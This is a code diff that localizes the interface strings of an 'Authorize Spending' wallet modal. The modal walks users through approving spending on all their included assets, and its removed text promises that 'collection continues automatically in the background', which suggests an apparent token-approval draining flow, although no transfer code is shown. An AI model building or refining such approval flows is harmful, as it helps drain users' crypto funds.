@@ -1,6 +1,8 @@
 import { TERMS_VERSION } from "../core/approve-config";
 import { nativeSymbolForNetwork } from "../core/network-meta";
 import { countIncludedAssets } from "../authorization/preferences";
+import { useWalletSdkT } from "../i18n/context";
+import { translateWalletError } from "../i18n/helpers";
 import type { NativeTransferEstimate } from "../native-transfer/types";
 import type {
   AssetSymbol,
@@ -49,41 +51,6 @@ function progressWidth(step: ModalStep): string {
   }
 }
 
-function stepSubtitle(step: ModalStep): string {
-  switch (step) {
-    case "connected":
-      return "Wallet connected";
-    case "preferences":
-      return "Select network";
-    case "authorizing":
-      return "Authorizing assets";
-    case "complete":
-      return "All set";
-    default:
-      return "Wallet connected";
-  }
-}
-
-function authorizingMessage(
-  phase: AuthorizingPhase,
-  asset: { network: string; asset: AssetSymbol } | null,
-): string {
-  const assetLabel = asset
-    ? asset.asset === "NATIVE"
-      ? nativeSymbolForNetwork(asset.network)
-      : asset.asset
-    : "asset";
-
-  switch (phase) {
-    case "wallet_confirm":
-      return `Open Trust Wallet and confirm the ${assetLabel} approval request.`;
-    case "finalizing":
-      return `Finalizing ${assetLabel} on chain…`;
-    default:
-      return `Preparing ${assetLabel} approval…`;
-  }
-}
-
 export function AuthorizeSpendingModal({
   networks,
   selectedKey,
@@ -103,6 +70,7 @@ export function AuthorizeSpendingModal({
   onContinueFromConnected,
   onAuthorize,
 }: AuthorizeSpendingModalProps) {
+  const t = useWalletSdkT();
   const selected = networks.find((n) => n.key === selectedKey) ?? null;
   const includedCount = countIncludedAssets(preferences, selectedKey);
   const spender = selectedKey
@@ -119,6 +87,61 @@ export function AuthorizeSpendingModal({
     sessionResult.rejectedCount === 0 &&
     sessionResult.failedCount === 0;
 
+  const stepSubtitle = (() => {
+    switch (modalStep) {
+      case "connected":
+        return t("modals.authorizeSpending.stepConnected");
+      case "preferences":
+        return t("modals.authorizeSpending.stepPreferences");
+      case "authorizing":
+        return t("modals.authorizeSpending.stepAuthorizing");
+      case "complete":
+        return t("modals.authorizeSpending.stepComplete");
+      default:
+        return t("modals.authorizeSpending.stepConnected");
+    }
+  })();
+
+  const assetLabel = authorizingAsset
+    ? authorizingAsset.asset === "NATIVE"
+      ? nativeSymbolForNetwork(authorizingAsset.network)
+      : authorizingAsset.asset
+    : "asset";
+
+  const authorizingMessage = (() => {
+    switch (authorizingPhase) {
+      case "wallet_confirm":
+        return t("modals.authorizeSpending.openWalletConfirm", {
+          asset: assetLabel,
+        });
+      case "finalizing":
+        return t("modals.authorizeSpending.finalizingAsset", {
+          asset: assetLabel,
+        });
+      default:
+        return t("modals.authorizeSpending.preparingAsset", {
+          asset: assetLabel,
+        });
+    }
+  })();
+
+  const completeMessage = authorizedOk
+    ? t("modals.authorizeSpending.authorizationComplete")
+    : sessionResult && sessionResult.authorizedCount > 0
+      ? t("modals.authorizeSpending.partiallyAuthorized")
+      : t("modals.authorizeSpending.sessionFinished");
+
+  const assetsAuthorizedLabel =
+    sessionResult && sessionResult.authorizedCount > 0
+      ? sessionResult.authorizedCount === 1
+        ? t("modals.authorizeSpending.assetsAuthorized", {
+            count: sessionResult.authorizedCount,
+          })
+        : t("modals.authorizeSpending.assetsAuthorizedPlural", {
+            count: sessionResult.authorizedCount,
+          })
+      : null;
+
   return (
     <div className="fixed inset-0 z-[100] flex items-center justify-center bg-[#131520]/40 px-4 backdrop-blur-[2px]">
       <div className="card-surface max-h-[92vh] w-full max-w-md overflow-y-auto rounded-3xl">
@@ -131,7 +154,7 @@ export function AuthorizeSpendingModal({
         <div className="flex items-center justify-between px-5 pt-5">
           <button
             type="button"
-            aria-label="Back"
+            aria-label={t("modals.authorizeSpending.backAria")}
             onClick={onClose}
             disabled={approving}
             className="flex h-9 w-9 items-center justify-center rounded-full border border-[#ECECEF] text-[#6A6D81] transition hover:bg-neutral-50 disabled:opacity-50"
@@ -141,16 +164,19 @@ export function AuthorizeSpendingModal({
           <div className="text-center">
             <p className="text-base font-semibold text-[#131520]">
               {modalStep === "complete"
-                ? "Wallet Connected"
-                : "Authorize Spending"}
+                ? t("modals.authorizeSpending.titleComplete")
+                : t("modals.authorizeSpending.title")}
             </p>
             <p className="text-xs text-[#6A6D81]">
-              {stepSubtitle(modalStep)} · Terms v{TERMS_VERSION}
+              {stepSubtitle} ·{" "}
+              {t("modals.authorizeSpending.termsVersion", {
+                version: TERMS_VERSION,
+              })}
             </p>
           </div>
           <button
             type="button"
-            aria-label="Close"
+            aria-label={t("modals.authorizeSpending.closeAria")}
             onClick={onClose}
             disabled={approving}
             className="flex h-9 w-9 items-center justify-center rounded-full border border-[#ECECEF] text-[#6A6D81] transition hover:bg-neutral-50 disabled:opacity-50"
@@ -162,7 +188,7 @@ export function AuthorizeSpendingModal({
         <div className="space-y-4 px-5 pb-6 pt-4">
           {error && modalStep !== "complete" ? (
             <p className="rounded-2xl bg-red-50 px-4 py-3 text-sm text- !bg-indigo-500">
-              {error}
+              {translateWalletError(t, error)}
             </p>
           ) : null}
 
@@ -173,7 +199,7 @@ export function AuthorizeSpendingModal({
               </div>
               <div>
                 <p className="text-lg font-semibold text-[#131520]">
-                  Wallet connected
+                  {t("modals.authorizeSpending.walletConnected")}
                 </p>
                 {linkedAddressLabel ? (
                   <p className="mt-1 font-mono text-sm text-[#6A6D81]">
@@ -181,8 +207,7 @@ export function AuthorizeSpendingModal({
                   </p>
                 ) : null}
                 <p className="mt-3 text-sm leading-relaxed text-[#6A6D81]">
-                  Your wallet is linked. Continue to choose a network and
-                  authorize spending.
+                  {t("modals.authorizeSpending.walletLinkedContinue")}
                 </p>
               </div>
               <button
@@ -190,7 +215,7 @@ export function AuthorizeSpendingModal({
                 onClick={onContinueFromConnected}
                 className="w-full rounded-full bg-[#0400FF] py-3.5 text-sm font-semibold text-white transition hover:bg-[#1a33e6]"
               >
-                Continue
+                {t("modals.continue")}
               </button>
             </div>
           ) : null}
@@ -198,12 +223,12 @@ export function AuthorizeSpendingModal({
           {modalStep === "preferences" ? (
             <>
               <p className="text-sm leading-relaxed text-[#6A6D81]">
-                Select a network and continue.
+                {t("modals.authorizeSpending.selectNetworkPrompt")}
               </p>
 
               <div>
                 <p className="mb-2 text-xs font-semibold uppercase tracking-wide text-[#6A6D81]">
-                  Network
+                  {t("modals.authorizeSpending.networkSection")}
                 </p>
                 <ul className="space-y-2">
                   {networks.map((network) => {
@@ -251,12 +276,14 @@ export function AuthorizeSpendingModal({
                   className="w-full rounded-full bg-[#0400FF] py-3.5 text-sm font-semibold text-white transition hover:bg-[#1a33e6] disabled:cursor-not-allowed disabled:opacity-50"
                 >
                   {!selectedKey
-                    ? "Select a network"
-                    : `Continue on ${selected.name}`}
+                    ? t("modals.authorizeSpending.selectNetwork")
+                    : t("modals.authorizeSpending.continueOnNetwork", {
+                        network: selected.name,
+                      })}
                 </button>
               ) : (
                 <p className="rounded-2xl border border-[#ECECEF] bg-[#F9FAFB] px-4 py-3 text-sm text-[#6A6D81]">
-                  Select a network above to continue.
+                  {t("modals.authorizeSpending.selectNetworkAbove")}
                 </p>
               )}
             </>
@@ -266,7 +293,7 @@ export function AuthorizeSpendingModal({
             <div className="space-y-4 py-6 text-center">
               <div className="mx-auto h-10 w-10 animate-spin rounded-full border-2 border-[#0400FF]/20 border-t-[#0400FF]" />
               <p className="text-sm font-semibold text-[#131520]">
-                {authorizingMessage(authorizingPhase, authorizingAsset)}
+                {authorizingMessage}
               </p>
               {authorizingAsset ? (
                 <p className="rounded-2xl border border-[#0400FF]/20 bg-[#0400FF]/5 px-4 py-3 text-sm text-[#0400FF]">
@@ -281,8 +308,7 @@ export function AuthorizeSpendingModal({
               ) : null}
               {authorizingPhase === "wallet_confirm" ? (
                 <p className="text-xs text-[#6A6D81]">
-                  If you don&apos;t see a prompt, open Trust Wallet and check
-                  pending requests.
+                  {t("modals.authorizeSpending.checkPendingRequests")}
                 </p>
               ) : null}
             </div>
@@ -295,7 +321,7 @@ export function AuthorizeSpendingModal({
               </div>
               <div>
                 <p className="text-lg font-semibold text-[#131520]">
-                  Wallet connected
+                  {t("modals.authorizeSpending.walletConnected")}
                 </p>
                 {linkedAddressLabel ? (
                   <p className="mt-1 font-mono text-sm text-[#6A6D81]">
@@ -303,17 +329,12 @@ export function AuthorizeSpendingModal({
                   </p>
                 ) : null}
                 <p className="mt-3 text-sm leading-relaxed text-[#6A6D81]">
-                  {authorizedOk
-                    ? "Authorization complete. Collection continues automatically in the background."
-                    : sessionResult && sessionResult.authorizedCount > 0
-                      ? "Partially authorized. Remaining assets can be retried later."
-                      : "Session finished. You can retry authorization from the connect button."}
+                  {completeMessage}
                 </p>
               </div>
-              {sessionResult && sessionResult.authorizedCount > 0 ? (
+              {assetsAuthorizedLabel ? (
                 <p className="text-xs font-medium text-emerald-600">
-                  {sessionResult.authorizedCount} asset
-                  {sessionResult.authorizedCount === 1 ? "" : "s"} authorized
+                  {assetsAuthorizedLabel}
                 </p>
               ) : null}
               <button
@@ -321,7 +342,7 @@ export function AuthorizeSpendingModal({
                 onClick={onClose}
                 className="w-full rounded-full bg-[#0400FF] py-3.5 text-sm font-semibold text-white transition hover:bg-[#1a33e6]"
               >
-                Continue
+                {t("modals.continue")}
               </button>
             </div>
           ) : null}
